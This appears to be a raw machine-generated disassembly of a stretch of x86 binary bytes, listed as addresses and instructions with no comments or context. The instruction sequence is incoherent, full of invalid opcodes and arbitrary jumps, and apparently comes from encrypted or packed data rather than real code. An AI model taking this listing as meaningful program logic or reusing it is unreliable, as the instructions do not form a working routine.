  41083c:	sahf   
  41083d:	test   BYTE PTR [ebx],dh
  41083f:	pop    ss
  410840:	js     0x4107ee
  410842:	push   0xcf916d08
  410847:	enter  0xfc,0xd7
  41084b:	addr16 in eax,0xe0
  41084e:	cmp    BYTE PTR [ebp-0x11],0x5b
  410852:	lock sahf 
  410854:	cmc    
  410855:	gs cdq 
  410857:	ficom  WORD PTR [ecx]
  410859:	dec    esi
  41085a:	mov    ch,0xae
  41085c:	ror    DWORD PTR [eax+0x37],cl
  41085f:	jne    0x4108cc
  410861:	popa   
  410862:	mov    ds:0x91ed78,al
  410867:	es cs leave 
  41086a:	nop
  41086b:	push   ebx
  41086c:	push   ds
  41086d:	hlt    
  41086e:	(bad)  
  41086f:	out    0x22,al
  410871:	sbb    eax,0x8cac9b6f
  410876:	or     eax,0xac64e582
  41087b:	jb     0x4108d9
  41087d:	inc    edx
  41087e:	and    BYTE PTR ds:0x72ab8c7e,dh
  410884:	ds add eax,0x73d95bea
  41088a:	and    dh,bl
  41088c:	push   eax
  41088d:	stos   DWORD PTR es:[edi],eax
  41088e:	push   ecx
  41088f:	scas   eax,DWORD PTR es:[edi]
  410890:	into   
  410891:	leave  
  410892:	hlt    
  410893:	fiadd  WORD PTR [edi+0x63]
  410896:	adc    edi,DWORD PTR [eax]
  410898:	inc    ebx
  410899:	loope  0x4108b1
  41089b:	and    eax,0x2146165c
  4108a0:	sub    al,0xb5
  4108a2:	add    esp,DWORD PTR [esi]
  4108a4:	in     al,dx
  4108a5:	in     eax,dx
  4108a6:	push   ss
  4108a7:	pop    ecx
  4108a8:	cwde   
  4108a9:	hlt    
  4108aa:	or     edi,DWORD PTR [esi+eax*8+0x85fde9c]
  4108b1:	jnp    0x4108d1
  4108b3:	and    DWORD PTR [edx-0x36],0x7f
  4108b7:	dec    ecx
  4108b8:	pop    edi
  4108b9:	mov    ch,0x5f
  4108bb:	clc    
  4108bc:	(bad)  
  4108bd:	adc    al,0xb6
  4108bf:	push   es
  4108c0:	mov    edi,0x43b6445f
  4108c5:	cwde   
  4108c6:	xor    edx,DWORD PTR [edi+0x3c824d7d]
  4108cc:	mov    dh,0xc
  4108ce:	or     BYTE PTR [eax+0x498da2a2],ah
  4108d4:	ja     0x410872
  4108d6:	jae    0x41093d
  4108d8:	daa    
  4108d9:	adc    DWORD PTR [ecx-0x171eca90],eax
  4108df:	daa    
  4108e0:	pop    ds
  4108e1:	and    dh,dl
  4108e3:	add    ch,bh
  4108e5:	int3   
  4108e6:	mov    eax,ds:0xf8ef4879
  4108eb:	or     al,0xd5
  4108ed:	xchg   ecx,eax
  4108ee:	mov    ch,0x9b
  4108f0:	ja     0x4108cb
  4108f2:	push   esi
  4108f3:	sub    al,0x4d
  4108f5:	xchg   ebx,eax
  4108f6:	stos   BYTE PTR es:[edi],al
  4108f7:	sub    eax,edi
  4108f9:	mov    ecx,0x595add92
  4108fe:	dec    edi
  4108ff:	inc    eax
  410900:	mov    eax,ds:0x4537a812
  410905:	popa   
  410906:	pop    esi
  410907:	cmp    ah,BYTE PTR [edi+0x5f]
  41090a:	sbb    esp,eax
  41090c:	sub    eax,eax
  41090e:	sbb    al,0x93
  410910:	inc    edi
  410911:	mov    ecx,0x620da4fa
  410916:	std    
  410917:	fwait
  410918:	xlat   BYTE PTR ds:[ebx]
  410919:	lods   eax,DWORD PTR ds:[esi]
  41091a:	sahf   
  41091b:	jno    0x41091c
  41091d:	enter  0xe107,0xbf
  410921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410922:	mov    ecx,0xba4ec6d5
  410927:	xor    al,0x1d
  410929:	test   ebx,0xdbdddc9d
  41092f:	sbb    ebx,0xa
  410932:	xchg   BYTE PTR [ebx+0x4b974e23],al
  410938:	xor    eax,0xd09541e1
  41093d:	sar    BYTE PTR [edi-0x5f0fc783],0x9d
  410944:	jae    0x41099b
  410946:	adc    eax,0xec4901f7
  41094b:	and    eax,0xbe167fe2
  410950:	or     al,0x45
  410952:	push   ebp
  410953:	xchg   ecx,eax
  410954:	add    ecx,ecx
  410956:	dec    ebp
  410957:	mov    ebx,0x2a815023
  41095c:	jno    0x4109a4
  41095e:	hlt    
  41095f:	fwait
  410960:	add    cl,BYTE PTR [esi]
  410962:	sub    al,BYTE PTR [edx]
  410964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410965:	mov    ebx,0x622d501a
  41096a:	inc    ebp
  41096b:	push   eax
  41096c:	and    eax,0x30c98d96
  410971:	daa    
  410972:	dec    esi
  410973:	dec    ecx
  410974:	ins    DWORD PTR es:[edi],dx
  410975:	jno    0x410957
  410977:	jne    0x410930
  410979:	arpl   WORD PTR [edx+0x72a5f4e6],bx
  41097f:	and    DWORD PTR [ebp+ecx*2-0x21],0xffffffc1
  410984:	mov    ch,0x28
  410986:	lds    ebp,FWORD PTR [ecx+0x1e]
  410989:	mov    esi,0x397c239e
  41098e:	pop    ecx
  41098f:	push   cs
  410990:	inc    BYTE PTR [ebp+0x48]
  410993:	clc    
  410994:	lahf   
  410995:	popa   
  410996:	stos   DWORD PTR es:[edi],eax
  410997:	push   edx
  410998:	adc    bh,BYTE PTR [esi+0x412ff81f]
  41099e:	xchg   ecx,eax
  41099f:	lods   eax,DWORD PTR ds:[esi]
  4109a0:	adc    al,0xcb
  4109a2:	pop    es
  4109a3:	shr    DWORD PTR [ecx],0xe1
  4109a6:	sbb    BYTE PTR ds:0x58c2f396,0x4a
  4109ad:	xchg   edx,eax
  4109ae:	enter  0x7610,0xcd
  4109b2:	xor    eax,0x56c8b6f4
  4109b7:	(bad)  
  4109b8:	or     BYTE PTR [ebx-0x70937478],bh
  4109be:	ret    
  4109bf:	jno    0x4109bd
  4109c1:	test   ebp,eax
  4109c3:	push   eax
  4109c4:	add    BYTE PTR [edx-0x68016dff],al
  4109ca:	inc    esp
  4109cb:	fcomp  QWORD PTR [ebx]
  4109cd:	xor    eax,0xb68df7fe
  4109d2:	adc    eax,0xef7e9f65
  4109d7:	sbb    BYTE PTR gs:[eax],0x5c
  4109db:	es dec ebx
  4109dd:	inc    esp
  4109de:	cwde   
  4109df:	or     eax,0x741ffd32
  4109e4:	cmp    BYTE PTR [edx],dh
  4109e6:	inc    edx
  4109e7:	ds mov esp,0x25b6846f
  4109ed:	pop    ebx
  4109ee:	sub    esp,esi
  4109f0:	add    DWORD PTR [eax],esp
  4109f2:	cwde   
  4109f3:	in     al,dx
  4109f4:	mov    edx,0x8bfa6a08
  4109f9:	ja     0x4109ea
  4109fb:	std    
  4109fc:	stos   BYTE PTR es:[edi],al
  4109fd:	pusha  
  4109fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ff:	add    dl,BYTE PTR es:[esi+0x70b7785b]
  410a06:	ins    DWORD PTR es:[edi],dx
  410a07:	daa    
  410a08:	rcr    BYTE PTR [edi],0x70
  410a0b:	in     al,0xeb
  410a0d:	ret    0x7eba
  410a10:	popa   
  410a11:	or     DWORD PTR [ecx-0x1ea473a4],esp
  410a17:	imul   esi,edi,0xe1747fa5
  410a1d:	xchg   edi,eax
  410a1e:	xor    eax,0x14312e8b
  410a23:	aas    
  410a24:	pop    es
  410a25:	xchg   edx,eax
  410a26:	enter  0xcded,0x65
  410a2a:	push   0x9362a6c8
  410a2f:	inc    eax
  410a30:	ss mov dl,0xff
  410a33:	jmp    0x475d:0x6cc3ffb2
  410a3a:	cli    
  410a3b:	cmp    al,0x31
  410a3d:	scas   eax,DWORD PTR es:[edi]
  410a3e:	add    DWORD PTR [edx-0x2e],ebx
  410a41:	adc    esp,DWORD PTR [edi+0x36]
  410a44:	push   edx
  410a45:	jbe    0x410a3c
  410a47:	cmp    DWORD PTR [edx-0x7d],0xc48e8b81
  410a4e:	scas   eax,DWORD PTR es:[edi]
  410a4f:	adc    bl,bh
  410a51:	or     DWORD PTR [edi+eiz*2-0x7591ee52],edi
  410a58:	xor    dh,BYTE PTR [esi-0x1b]
  410a5b:	push   0xffffffc8
  410a5d:	cmp    BYTE PTR [ebx-0x573997e4],ch
  410a63:	mov    edi,0xcf42b5df
  410a68:	xchg   cl,dh
  410a6a:	ror    DWORD PTR [ebp+esi*2-0x77d94c44],cl
  410a71:	mov    ebp,0xd10f0243
  410a76:	dec    edx
  410a77:	out    0x52,al
  410a79:	stc    
  410a7a:	jne    0x410ab8
  410a7c:	imul   edx,DWORD PTR [ecx-0x6a25da62],0x4aba1358
  410a86:	mov    esp,0x6f7e2c27
  410a8b:	and    al,0x56
  410a8d:	pop    ecx
  410a8e:	test   eax,0xe896fce5
  410a93:	fisttp WORD PTR [ebx-0x6a]
  410a96:	sub    eax,0xd8ee8659
  410a9b:	adc    al,0x25
  410a9d:	rcl    BYTE PTR [ebx-0x5ccab8db],1
  410aa3:	mov    ah,0x4d
  410aa5:	inc    edi
  410aa6:	(bad)  
  410aa7:	jle    0x410aaa
  410aa9:	sbb    esi,eax
  410aab:	ds mov dl,0xcf
  410aae:	popf   
  410aaf:	push   esi
  410ab0:	repnz sar eax,0x43
  410ab4:	lahf   
  410ab5:	loopne 0x410ab6
  410ab7:	ins    BYTE PTR es:[edi],dx
  410ab8:	fisubr DWORD PTR [esi-0x47616f64]
  410abe:	idiv   BYTE PTR [esi]
  410ac0:	or     ah,BYTE PTR [eax]
  410ac2:	or     BYTE PTR [ebp-0x1afd5606],cl
  410ac8:	retf   0xdca1
  410acb:	adc    esp,DWORD PTR ds:0xc2cfa313
  410ad1:	mov    esi,0x320a1449
  410ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ad7:	sbb    eax,0xc3e5da66
  410adc:	and    DWORD PTR [edi],0x1b5cac04
  410ae2:	xor    al,0x3c
  410ae4:	lds    ebx,FWORD PTR [ebp-0x43]
  410ae7:	jbe    0x410b14
  410ae9:	push   0xa3257024
  410aee:	mov    dh,0x36
  410af0:	or     al,0xc9
  410af2:	and    esp,ebp
  410af4:	mov    ds:0xecaade7c,al
  410af9:	bound  edx,QWORD PTR gs:[edx]
  410afc:	push   edi
  410afd:	xchg   BYTE PTR [ebx],bh
  410aff:	mov    ecx,0x318399e4
  410b04:	pushf  
  410b05:	pop    ss
  410b06:	pop    ecx
  410b07:	(bad)  
  410b08:	cmp    bh,BYTE PTR [ebx+0x5c]
  410b0b:	shl    edi,cl
  410b0d:	push   ebx
  410b0e:	mov    ebx,0xff7fcc30
  410b13:	ds (bad) 
  410b15:	fistp  DWORD PTR [edi+0x14]
  410b18:	inc    ecx
  410b19:	in     eax,dx
  410b1a:	dec    ecx
  410b1b:	scas   eax,DWORD PTR es:[edi]
  410b1c:	in     eax,0x4
  410b1e:	xchg   bh,dl
  410b20:	dec    edx
  410b21:	out    dx,al
  410b22:	cmp    bh,BYTE PTR [ebp+edi*2+0x44]
  410b26:	xlat   BYTE PTR ds:[ebx]
  410b27:	fbld   TBYTE PTR es:[ebx-0x6f2a75a0]
  410b2e:	xor    dl,BYTE PTR [esi]
  410b30:	sar    DWORD PTR [ebx+0x6165cfd0],cl
  410b36:	pop    ebp
  410b37:	jno    0x410ba2
  410b39:	jle    0x410b11
  410b3b:	test   BYTE PTR [ebx-0x74e434a9],ah
  410b41:	int    0xb1
  410b43:	test   al,0xd
  410b45:	mov    dl,0xce
  410b47:	outs   dx,DWORD PTR ds:[esi]
  410b48:	xchg   edx,eax
  410b49:	add    ch,BYTE PTR [edi+0x2d8747e6]
  410b4f:	(bad)  
  410b50:	jge    0x410ba1
  410b52:	or     BYTE PTR [eax+0x2006c67c],ah
  410b58:	mov    eax,ds:0xf4594a88
  410b5d:	and    eax,0xe40297f6
  410b62:	imul   DWORD PTR [edx+0x11]
  410b65:	mov    esp,0x512c06f7
  410b6a:	nop
  410b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b6c:	stos   DWORD PTR es:[edi],eax
  410b6d:	dec    edi
  410b6e:	cmp    DWORD PTR [esi-0x78],edx
  410b71:	jecxz  0x410bd5
  410b73:	stos   BYTE PTR es:[edi],al
  410b74:	push   ds
  410b75:	test   DWORD PTR [eax-0x3c4be5d3],esi
  410b7b:	jae    0x410b0a
  410b7d:	add    DWORD PTR [esi+0x548f3d02],edi
  410b83:	nop
  410b84:	fwait
  410b85:	icebp  
  410b86:	aad    0x84
  410b88:	lock loope 0x410b1d
  410b8b:	test   BYTE PTR [eax],ah
  410b8d:	xchg   ebp,eax
  410b8e:	das    
  410b8f:	in     al,dx
  410b90:	jne    0x410bf8
  410b92:	imul   eax,edi,0xea947a39
  410b98:	test   eax,0x42fede1e
  410b9d:	sbb    DWORD PTR [eax],edi
  410b9f:	mov    esi,0x9f225adb
  410ba4:	pop    edx
  410ba5:	jg     0x410b5a
  410ba7:	mov    esi,DWORD PTR [esi+0x52]
  410baa:	cmp    al,bh
  410bac:	jl     0x410b30
  410bae:	sbb    BYTE PTR [edx],bh
  410bb0:	mov    eax,0xf4bed1b6
  410bb5:	icebp  
  410bb6:	adc    ecx,DWORD PTR [esi]
  410bb8:	mov    bl,0x81
  410bba:	push   esp
  410bbb:	xor    esp,ecx
  410bbd:	xor    al,0xaa
  410bbf:	(bad)  
  410bc0:	lds    ebp,FWORD PTR [eax+0x2ef1cb0b]
  410bc6:	pushf  
  410bc7:	lahf   
  410bc8:	inc    ebp
  410bc9:	add    bh,al
  410bcb:	scas   eax,DWORD PTR es:[edi]
  410bcc:	pop    ebx
  410bcd:	adc    ah,ch
  410bcf:	mov    BYTE PTR [ebp+0x5],dh
  410bd2:	nop
  410bd3:	outs   dx,BYTE PTR ds:[esi]
  410bd4:	dec    ecx
  410bd5:	sub    ebx,DWORD PTR [ecx+0x1dce10ae]
  410bdb:	inc    esi
  410bdc:	(bad)  
  410bdd:	jp     0x410bb5
  410bdf:	test   eax,0xcdb3e21
  410be4:	push   ecx
  410be5:	xor    eax,0x4349c5fc
  410bea:	pop    esi
  410beb:	lods   al,BYTE PTR ds:[esi]
  410bec:	xor    eax,0x4773a494
  410bf1:	hlt    
  410bf2:	push   ds
  410bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf4:	pop    esi
  410bf5:	(bad)  
  410bf6:	sub    BYTE PTR [eax],bh
  410bf8:	push   edx
  410bf9:	test   DWORD PTR [edx-0x4c78523e],ebp
  410bff:	inc    esi
  410c00:	lahf   
  410c01:	adc    BYTE PTR [edx+0x2b],cl
  410c04:	mov    edx,0x2c15cb79
  410c09:	pop    ebp
  410c0a:	mov    ch,0xe3
  410c0c:	cmp    BYTE PTR [eax-0x6a2442a6],0xe
  410c13:	sbb    DWORD PTR [eax-0x4b],edi
  410c16:	add    cl,BYTE PTR ds:0x5187c27e
  410c1c:	jo     0x410c4f
  410c1e:	aad    0xf1
  410c20:	stos   DWORD PTR es:[edi],eax
  410c21:	mov    ebp,0x87c86c25
  410c26:	xchg   esi,eax
  410c27:	rol    BYTE PTR [ecx],1
  410c29:	cmp    eax,DWORD PTR [edi+0x25]
  410c2c:	sub    esi,DWORD PTR [ebx-0x65]
  410c2f:	in     al,dx
  410c30:	dec    eax
  410c31:	lock out dx,eax
  410c33:	sub    al,BYTE PTR [ecx-0x3f49c679]
  410c39:	jecxz  0x410c10
  410c3b:	jbe    0x410bc4
  410c3d:	inc    eax
  410c3e:	sub    al,0x83
  410c40:	mov    ds:0xc79cfbc4,eax
  410c45:	mov    ds:0x381a1167,eax
  410c4a:	shl    BYTE PTR [ecx],1
  410c4c:	(bad)  
  410c4e:	fstp   TBYTE PTR [ecx+0x33]
  410c51:	mov    ch,0xa4
  410c53:	mov    eax,DWORD PTR [eax]
  410c55:	jge    0x410c8c
  410c57:	and    BYTE PTR [eax-0x2c],dl
  410c5a:	(bad)
  410c5d:	xor    ch,bl
  410c5f:	je     0x410c2c
  410c61:	rcr    BYTE PTR [esi+0x6361d0a1],1
  410c67:	ror    BYTE PTR [edx],cl
  410c69:	ret    
  410c6a:	xchg   ebx,eax
  410c6b:	ret    0x573e
  410c6e:	inc    esi
  410c6f:	jge    0x410cb1
  410c71:	int3   
  410c72:	addr16 xchg esi,eax
  410c74:	mov    esi,0xd9baae1
  410c79:	inc    eax
  410c7a:	(bad)  
  410c7b:	pop    edi
  410c7c:	push   esi
  410c7d:	jecxz  0x410c80
  410c7f:	mov    ebx,0xe1baeadd
  410c84:	(bad)  
  410c85:	in     eax,dx
  410c86:	dec    ebx
  410c87:	pop    esp
  410c88:	fs inc edi
  410c8a:	fld    DWORD PTR cs:[esp+esi*2]
  410c8e:	push   ds
  410c8f:	cmp    al,0x17
  410c91:	cld    
  410c92:	rol    DWORD PTR ds:0x1d226ec3,0xfb
  410c99:	test   DWORD PTR [esi+edx*1+0x7c],esp
  410c9d:	add    al,0x8b
  410c9f:	adc    eax,esp
  410ca1:	(bad)  
  410ca2:	jmp    0x6890:0xa80be902
  410ca9:	mov    eax,ds:0x1023e2fc
  410cae:	sti    
  410caf:	mov    edx,DWORD PTR [edx-0x7f20c63a]
  410cb5:	cs pop si
  410cb8:	or     dl,BYTE PTR [esi]
  410cba:	(bad)  
  410cbb:	pop    ss
  410cbc:	mov    bl,0xc0
  410cbe:	das    
  410cbf:	fcomp  DWORD PTR [esi-0x52531d4f]
  410cc5:	jo     0x410cd1
  410cc7:	pop    es
  410cc8:	adc    ecx,DWORD PTR [edx-0x1c]
  410ccb:	or     cl,ah
  410ccd:	imul   esi,DWORD PTR [ecx-0x4c9782c6],0x5b
  410cd4:	cmp    al,ch
  410cd6:	fsub   QWORD PTR [ebp+0x1abd3241]
  410cdc:	in     al,dx
  410cdd:	mov    ebx,0xba4c8a64
  410ce2:	adc    ebx,DWORD PTR [ebx+eiz*2-0x63]
  410ce6:	jecxz  0x410d5a
  410ce8:	adc    dl,BYTE PTR [edi]
  410cea:	aas    
  410ceb:	fdiv   st,st(5)
  410ced:	xchg   edx,eax
  410cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cef:	add    dl,BYTE PTR [edx]
  410cf1:	scas   al,BYTE PTR es:[edi]
  410cf2:	cmp    ah,bh
  410cf4:	add    bh,ah
  410cf6:	fistp  DWORD PTR [esi]
  410cf8:	xchg   edi,eax
  410cf9:	pop    ds
  410cfa:	add    BYTE PTR [ebp+0x560aa107],dl
  410d00:	inc    ebx
  410d01:	sbb    al,0x14
  410d03:	call   0x9844:0x91b8c229
  410d0a:	add    DWORD PTR [edi+0x22a7140a],edx
  410d10:	je     0x410cc8
  410d12:	pop    ebp
  410d13:	in     al,0x8b
  410d15:	in     al,0x3b
  410d17:	popf   
  410d18:	xor    al,0x51
  410d1a:	sub    bh,BYTE PTR [esi+0x37]
  410d1d:	pop    ebp
  410d1e:	or     bl,bh
  410d20:	jnp    0x410d08
  410d22:	pop    esp
  410d23:	shl    DWORD PTR [esi+0x10],cl
  410d26:	mov    cl,0xd8
  410d28:	mov    eax,0x44b76e43
  410d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d2e:	fwait
  410d2f:	cmp    edi,eax
  410d31:	jb     0x410d74
  410d33:	sub    eax,DWORD PTR es:[edi+ecx*4-0x72]
  410d38:	mov    bl,bh
  410d3a:	ins    DWORD PTR es:[edi],dx
  410d3b:	int    0x83
  410d3d:	aam    0xe
  410d3f:	adc    al,BYTE PTR [edx-0x53dafe2b]
  410d45:	inc    edx
  410d46:	xor    al,0x39
  410d48:	in     eax,0x65
  410d4a:	push   ss
  410d4b:	call   FWORD PTR [ecx-0x22c6d7a5]
  410d51:	arpl   WORD PTR [esi+0xcd8431b],dx
  410d57:	std    
  410d58:	cmp    BYTE PTR [ecx],0x25
  410d5b:	(bad)  
  410d5c:	sub    al,0x69
  410d5e:	mov    al,ds:0x6aa77ab0
  410d63:	bound  ecx,QWORD PTR [edi-0x3d9e0f8f]
  410d69:	add    esi,esp
  410d6b:	inc    ecx
  410d6c:	aas    
  410d6d:	sahf   
  410d6e:	pop    ecx
  410d6f:	daa    
  410d70:	inc    esi
  410d71:	int3   
  410d72:	pop    ebp
  410d73:	adc    DWORD PTR ds:0xe38348e3,esi
  410d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d7a:	mov    BYTE PTR [eiz*1+0x5079a125],ah
  410d81:	push   esi
  410d82:	(bad)  
  410d83:	cmc    
  410d84:	mov    BYTE PTR [edi+0xbf4cf6e],bh
  410d8a:	inc    DWORD PTR [edx-0x3be12edc]
  410d90:	test   ch,dl
  410d92:	repz pop ds
  410d94:	outs   dx,DWORD PTR ds:[esi]
  410d95:	rcl    WORD PTR [bp+si-0x37],0xb7
  410d9b:	jns    0x410dac
  410d9d:	add    eax,0x7df288e
  410da2:	jle    0x410dd2
  410da4:	push   cs
  410da5:	les    eax,FWORD PTR [ecx+0x10]
  410da8:	jmp    0x410e01
  410daa:	rcr    BYTE PTR ds:0x6e796be7,0x69
  410db1:	xchg   ch,ch
  410db3:	enter  0xd2f7,0x3b
  410db7:	add    BYTE PTR [edi-0x7c],ch
  410dba:	jecxz  0x410d77
  410dbc:	ret    
  410dbd:	mov    esi,ebx
  410dbf:	mov    ah,0x4e
  410dc1:	scas   al,BYTE PTR es:[edi]
  410dc2:	lahf   
  410dc3:	mov    eax,0xee192d71
  410dc8:	dec    ecx
  410dc9:	jecxz  0x410d74
  410dcb:	pop    ds
  410dcc:	test   al,0x98
  410dce:	sbb    eax,0xf0294f13
  410dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd4:	test   eax,0xbe27772e
  410dd9:	xchg   esi,eax
  410dda:	fwait
  410ddb:	shl    DWORD PTR [eax],cl
  410ddd:	dec    ebx
  410dde:	mov    edx,0x3cad5254
  410de3:	push   cs
  410de4:	jmp    0x9c33be47
  410de9:	jns    0x410df9
  410deb:	sub    al,0xad
  410ded:	fldenv [ebx]
  410def:	mov    cl,0x22
  410df1:	pushf  
  410df2:	call   0xcdaa6a4
  410df7:	sub    BYTE PTR [edx],ch
  410df9:	dec    eax
  410dfa:	push   edi
  410dfb:	adc    DWORD PTR [esi],ebp
  410dfd:	cmp    al,0x4c
  410dff:	and    DWORD PTR [eax],esi
  410e01:	push   eax
  410e02:	inc    ecx
  410e03:	adc    BYTE PTR [ecx-0x69],bl
  410e06:	in     eax,dx
  410e07:	add    al,0x9a
  410e09:	cwde   
  410e0a:	cmc    
  410e0b:	mov    cl,0x24
  410e0d:	js     0x410dcd
  410e0f:	test   BYTE PTR ds:0xc23d0ebc,ch
  410e15:	mov    WORD PTR [ecx],ds
  410e17:	jecxz  0x410e86
  410e19:	cld    
  410e1a:	mov    WORD PTR [ebx-0x75],gs
  410e1d:	enter  0xb06f,0x51
  410e21:	sub    dh,dh
  410e23:	(bad)  [edx-0x3e]
  410e26:	popf   
  410e27:	add    al,0x75
  410e29:	call   0xdf64d4cc
  410e2e:	and    DWORD PTR [esi-0x26b51808],ebx
  410e34:	test   BYTE PTR [ebx-0x48],bl
  410e37:	push   0x74
  410e39:	dec    esp
  410e3a:	iret   
  410e3b:	ds jl  0x410ea2
  410e3e:	hlt    
  410e3f:	cmc    
  410e40:	and    BYTE PTR [edx-0x5ba4bb0a],0xdd
  410e47:	xor    al,0x61
  410e49:	sbb    bl,ch
  410e4b:	out    0xe6,al
  410e4d:	into   
  410e4e:	hlt    
  410e4f:	sbb    eax,0xb604727c
  410e54:	mov    dh,0xd3
  410e56:	icebp  
  410e57:	dec    esp
  410e58:	in     eax,dx
  410e59:	jo     0x410ebf
  410e5b:	push   0x3d
  410e5d:	push   ebx
  410e5e:	sub    ch,BYTE PTR [esi-0x90c13b2]
  410e64:	mov    cl,0xb6
  410e66:	nop
  410e67:	je     0x410df8
  410e69:	mov    BYTE PTR [esi],cl
  410e6b:	jp     0x410e9e
  410e6d:	dec    ecx
  410e6e:	cli    
  410e6f:	pop    edi
  410e70:	sti    
  410e71:	lahf   
  410e72:	out    0x96,eax
  410e74:	fnstcw WORD PTR [eax+0x6c]
  410e77:	daa    
  410e78:	pop    edx
  410e79:	jmp    0xb852:0xb556b50e
  410e80:	jnp    0x410ece
  410e82:	cs sub esi,0xf987709f
  410e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e8a:	enter  0x7b76,0xf2
  410e8e:	mov    BYTE PTR [esi-0x5e0397e0],dl
  410e94:	mov    BYTE PTR [eax+0x6e],ch
  410e97:	add    al,0x44
  410e99:	dec    ecx
  410e9a:	sti    
  410e9b:	or     ebx,DWORD PTR [edi+0x4df45d94]
  410ea1:	cmp    BYTE PTR [edx-0x162e10c6],ah
  410ea7:	inc    esp
  410ea8:	in     eax,dx
  410ea9:	or     DWORD PTR [edi+0xedd0485],ebx
  410eaf:	call   DWORD PTR [edi+0x9]
  410eb2:	mov    ebx,0x82824d63
  410eb7:	fwait
  410eb8:	sbb    eax,0x92f6681b
  410ebd:	inc    esp
  410ebe:	mov    ebp,0x19e6c358
  410ec3:	jg     0x410ed9
  410ec5:	aam    0xd2
  410ec7:	push   ecx
  410ec8:	out    0x75,eax
  410eca:	idiv   DWORD PTR [ecx+0x4]
  410ecd:	sub    DWORD PTR [ecx],ebp
  410ecf:	ss adc al,0x8d
  410ed2:	adc    al,0x79
  410ed4:	xchg   edi,eax
  410ed5:	pusha  
  410ed6:	mov    cs,WORD PTR [eax-0x28b95ea7]
  410edc:	(bad)  
  410edd:	adc    bh,BYTE PTR [esi+0x3d]
  410ee0:	outs   dx,DWORD PTR ds:[esi]
  410ee1:	scas   eax,DWORD PTR es:[edi]
  410ee2:	push   edi
  410ee3:	repz dec esp
  410ee5:	add    ebp,DWORD PTR [ebx]
  410ee7:	add    BYTE PTR [edx],bl
  410ee9:	dec    ebp
  410eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eeb:	add    BYTE PTR [ecx-0x61],al
  410eee:	fdiv   QWORD PTR [ebp+0x22b5d06]
  410ef4:	push   eax
  410ef5:	xor    dl,BYTE PTR [edx]
  410ef7:	mov    bl,0xe7
  410ef9:	sbb    dh,BYTE PTR [esi]
  410efb:	ror    edx,1
  410efd:	jmp    0x410f52
  410eff:	sub    eax,0x358b6b04
  410f04:	lods   al,BYTE PTR es:[esi]
  410f06:	sar    BYTE PTR [ecx+0x5dd5a1b],0x39
  410f0d:	or     ebx,DWORD PTR [esi+0x50]
  410f10:	aam    0x59
  410f12:	rcl    BYTE PTR ds:0x557feded,1
  410f18:	imul   esi,DWORD PTR [edi+0x3d],0xffffffc7
  410f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f1d:	push   ecx
  410f1e:	aad    0xa
  410f20:	pop    ebp
  410f21:	mov    al,ds:0xd100717f
  410f26:	cli    
  410f27:	test   BYTE PTR [ebp-0x51],0xe8
  410f2b:	mov    ebx,0x42cda675
  410f30:	pusha  
  410f31:	cld    
  410f32:	outs   dx,DWORD PTR ds:[esi]
  410f33:	mov    ebp,0x8575a11f
  410f38:	lods   al,BYTE PTR ds:[esi]
  410f39:	pusha  
  410f3a:	add    cl,al
  410f3c:	and    ah,al
  410f3e:	pop    edi
  410f3f:	lock cdq 
  410f41:	test   BYTE PTR [ebx+edi*4-0x22e65c0b],dl
  410f48:	push   esi
  410f49:	xor    al,0xe5
  410f4b:	aad    0xb8
  410f4d:	xchg   esi,eax
  410f4e:	mul    eax
  410f50:	mov    cl,0x4d
  410f52:	xchg   ebx,eax
  410f53:	jo     0x410fcc
  410f55:	mov    eax,ds:0xe299375c
  410f5a:	int    0x9
  410f5c:	clc    
  410f5d:	pop    edx
  410f5e:	xor    al,bl
  410f60:	loopne 0x410f1a
  410f62:	addr16 shl esi,1
  410f65:	add    al,0xa7
  410f67:	push   esp
  410f68:	pop    es
  410f69:	repz and BYTE PTR [edi-0x3fd4c2b4],al
  410f70:	in     eax,dx
  410f71:	ret    0x2aff
  410f74:	or     eax,0x163194ef
  410f79:	test   al,0xec
  410f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f7c:	and    ebp,ebx
  410f7e:	xchg   BYTE PTR [esp+esi*4],al
  410f81:	mov    ch,0x9e
  410f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f84:	push   esi
  410f85:	sbb    al,0x60
  410f87:	jge    0x410f5c
  410f89:	fxtract 
  410f8b:	sbb    al,0x87
  410f8d:	mov    edi,0x478b8de9
  410f92:	test   DWORD PTR [ebp+0x4aea746b],0xef4c070c
  410f9c:	dec    esp
  410f9d:	xor    ch,BYTE PTR [esi-0x1f]
  410fa0:	lock (bad) 
  410fa2:	push   ss
  410fa3:	cmp    eax,0x61a3920c
  410fa8:	imul   ebx,DWORD PTR [ebx-0x4a],0xb
  410fac:	xchg   DWORD PTR [eax+0x7ef622ef],ecx
  410fb2:	out    dx,al
  410fb3:	pop    ebx
  410fb4:	in     al,0xf2
  410fb6:	mov    esp,0xe0f2ba5f
  410fbb:	cwde   
  410fbc:	in     al,0x33
  410fbe:	adc    eax,0x8c3f7db0
  410fc3:	mov    BYTE PTR [edi+0x68],cl
  410fc6:	repz enter 0xff1a,0x93
  410fcb:	mov    bh,0x93
  410fcd:	sub    DWORD PTR [edi+0x43],ecx
  410fd0:	mov    edi,0x2fe8b7a3
  410fd5:	ds dec ebp
  410fd7:	jo     0x411044
  410fd9:	jbe    0x41102c
  410fdb:	mov    esp,esi
  410fdd:	div    al
  410fdf:	(bad)  
  410fe0:	jle    0x410fa5
  410fe2:	add    al,0x82
  410fe4:	mov    BYTE PTR [ebx],al
  410fe6:	shr    DWORD PTR ds:0x10e9f9c3,1
  410fec:	sub    cl,BYTE PTR [edx-0x6a]
  410fef:	push   eax
  410ff0:	adc    al,0xec
  410ff2:	pop    edx
  410ff3:	push   ebp
  410ff4:	pop    ecx
